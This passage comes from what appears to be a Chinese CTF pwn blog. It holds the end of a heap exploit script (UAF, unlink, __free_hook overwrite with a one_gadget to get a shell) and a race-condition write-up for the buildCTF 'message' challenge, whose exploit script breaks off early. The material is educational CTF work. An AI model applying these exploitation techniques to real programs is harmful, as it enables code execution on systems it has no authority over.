:p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> :<span class="built_in">print</span>(p.recv())</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot;</span> <span class="comment"># ubuntu16</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.27.so&quot; # ubuntu18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27865)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf，无PIE，打unlink</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)<span class="comment">#p32(0x31)</span></span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">heapptr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">lg(<span class="string">&quot;heap_ptr: &quot;</span>,heapptr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,p64(heapptr+<span class="number">0x10</span>)) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">6</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">7</span>) <span class="comment"># 1</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602060</span></span><br><span class="line">target = ptr + <span class="number">0x30</span></span><br><span class="line">payload = p64(target-<span class="number">0x18</span>) + p64(target-<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p32(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,payload) <span class="comment"># fake_chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">b&quot;\x21&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>-<span class="number">0x58</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">edit(<span class="number">6</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">edit(<span class="number">3</span>,p64(libc.address+one[<span class="number">1</span>])) <span class="comment">#+0x4527a</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件竞争</title>
      <link href="/2024/11/05/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
      <url>/2024/11/05/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>参考文章:<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/race-condition/introduction/">ctf.wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。这个术语最初来自于两个电信号互相竞争来影响输出结果。</p></blockquote><p><mark>简单来说就是当一个资源被两个进程同时调用，那么就会出错。<mark></mark></mark></p><hr><p>通常，条件竞争出现下面<code>三种情况</code>:</p><blockquote><ul><li>并发，即至少存在两个并发执行流。这里的执行流包括线程，进程，任务等级别的执行流。</li><li>共享对象，即多个并发流会访问同一对象。<strong>常见的共享对象有共享内存，文件系统，信号。一般来说，这些共享对象是用来使得多个程序执行流相互交流。</strong>此外，我们称访问共享对象的代码为<strong>临界区</strong>。在正常写代码时，这部分应该加锁。</li><li>改变对象，即至少有一个控制流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。</li></ul></blockquote><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码摘自ctf.wiki</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> counter;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">IncreaseCounter</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">  counter += <span class="number">1</span>;</span><br><span class="line">  sleep(<span class="number">0.1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thread %d has counter value %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)pthread_self(),</span><br><span class="line">         counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">pthread_t</span> p[<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    pthread_create(&amp;p[i], <span class="literal">NULL</span>, IncreaseCounter, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    pthread_join(p[i], <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>这个程序使用 POSIX 线程（<code>pthread</code>）库创建了 10 个线程，并让每个线程执行 <code>IncreaseCounter</code> 函数。代码的目的是通过线程来增加一个共享变量 <code>counter</code> 的值并打印每个线程的 ID 及 <code>counter</code> 的当前值。</li><li>我们预期的输出应该是每个线程<code>conunter+1</code>，即：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread .. has counter value <span class="number">1</span></span><br><span class="line">Thread .. has counter value <span class="number">2</span></span><br><span class="line">Thread .. has counter value <span class="number">3</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><ul><li>但是实际的输出却不尽如人意:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241106200906830.bmp"></p><ul><li>为什么会出现这样的输出呢？</li></ul><p><code>counter</code>作为一个全局变量，但是却在多个线程之间+1，这样会导致条件竞争，使得多个线程在没有同步的情况下对<code>counter</code>进行读写，从而导致<code>counter</code>出错。</p><p><mark>更加详细的参考开头的文章<mark></mark></mark></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><ul><li><code>2024buildCTF-message</code></li></ul><p>参考文章:<a class="link" href="https://blog.csdn.net/weixin_52640415/article/details/143349375?spm=1001.2014.3001.5502">stone神 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h2><ul><li><code>主要部分</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  my_init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">2uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi((<span class="type">const</span> <span class="type">char</span> *)&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        view_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        delete_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        buy_BTC();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>在init函数里面的<code>clear_file</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">clear_file</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;message.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;File &#x27;%s&#x27; has been cleared.\n&quot;</span>, <span class="string">&quot;message.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>add_message</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILE *__fastcall <span class="title function_">add_message</span><span class="params">(FILE **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = fopen(<span class="string">&quot;message.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">  result = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>edit_message</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit_message</span><span class="params">(FILE **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You should add message first&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Message file detected&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  clear_file();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now please leave your message :&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x50</span>uLL);</span><br><span class="line">  fwrite(s, <span class="number">1uLL</span>, <span class="number">0x50</span>uLL, *a1);</span><br><span class="line">  <span class="keyword">return</span> fflush(*a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>view_message</code></li><li><mark>两秒检查一次<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">view_message</span><span class="params">(FILE **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You should add message first&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  fseek(*a1, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">  n = ftell(*a1);</span><br><span class="line">  fseek(*a1, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  fread(s, <span class="number">1uLL</span>, n, *a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><h6 id="ftell"><a href="#ftell" class="headerlink" title="ftell"></a><code>ftell</code></h6><p><code>ftell</code> 用于获取文件指针在文件中的当前位置，以字节为单位返回位置。</p><p>&gt;&gt;&gt;文件指针距离文件开头的距离</p><h6 id="fseek"><a href="#fseek" class="headerlink" title="fseek"></a><code>fseek</code></h6><p><code>fseek</code> 用于在文件中移动文件指针，允许从文件的指定位置开始读取或写入数据。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fseek</span><span class="params">(FILE *stream, <span class="type">long</span> <span class="type">int</span> offset, <span class="type">int</span> whence)</span>;</span><br><span class="line">&gt;&gt;&gt; fseek(*a1, <span class="number">0LL</span>, <span class="number">2</span>);<span class="comment">// 表示移动到结尾</span></span><br></pre></td></tr></table></figure></div></blockquote><ul><li>主要用到的就上面几个模块</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>漏洞点就出现在<code>edit_message</code>之中，2秒之后才会执行clear_file，在这之间我们可以开启两个线程，第一个随便写，第二个进程写入ROP，ROP的执行点就在<code>view_message</code>之中，由于我们两次进程写入同一个共享资源<code>message.txt</code>中，虽然每次只规定写0x50,但是两个进程可以写入0x100,会造成<code>view_message</code>中栈溢出</p><p>可以第一个进程写入0x50的垃圾数据，然后第二个进程再补0x28的垃圾数据，然后就是正常的ret2libc了</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"><span class="comment">#libc = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span 